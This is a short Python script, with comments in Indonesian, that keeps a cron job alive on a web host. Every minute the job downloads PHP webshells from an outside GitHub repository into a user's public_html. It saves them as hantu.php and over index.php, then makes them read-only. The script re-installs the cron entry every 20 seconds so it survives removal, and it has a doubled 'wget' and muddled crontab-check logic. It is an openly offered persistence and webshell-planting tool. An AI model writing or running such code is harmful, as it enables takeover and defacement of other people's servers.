from __future__ import print_function  # For Python 2 compatibility
import subprocess
import time

def run_command(command):
    try:
        # For Python 3
        return subprocess.getoutput(command)
    except AttributeError:
        # For Python 2
        return subprocess.check_output(command, shell=True)

target_cron = '* * * * * wget https://raw.githubusercontent.com/realemctwo/webshell-os/main/gecko.php -O /home1/ezttra74/public_html/hantu.php && chmod 0444 /home1/ezttra74/public_html/hantu.php && wget https://raw.githubusercontent.com/realemctwo/webshell-os/main/enricozt.php -O /home1/ezttra74/public_html/index.php && chmod 0444 /home1/ezttra74/public_html/index.php'

while True:
    crontab = run_command('''echo "* * * * * wget wget https://raw.githubusercontent.com/realemctwo/webshell-os/main/gecko.php -O /home1/ezttra74/public_html/hantu.php && chmod 0444 /home1/ezttra74/public_html/hantu.php && wget https://raw.githubusercontent.com/realemctwo/webshell-os/main/enricozt.php -O /home1/ezttra74/public_html/index.php && chmod 0444 /home1/ezttra74/public_html/index.php" | crontab''')

    if target_cron not in crontab:
        output = run_command('echo "{}" | crontab'.format(target_cron))
        print("Perintah tidak ditemukan di crontab. Hasil whoami: {}".format(output))
    else:
        print("Perintah sudah ada di crontab. Tidak ada tindakan yang diambil.")

    time.sleep(20)

    #Start : python tes.py#
    #Stop : pkill -u(nama username)
    #Stop2 : crontab -r#
    #Cek script : crontab -l#
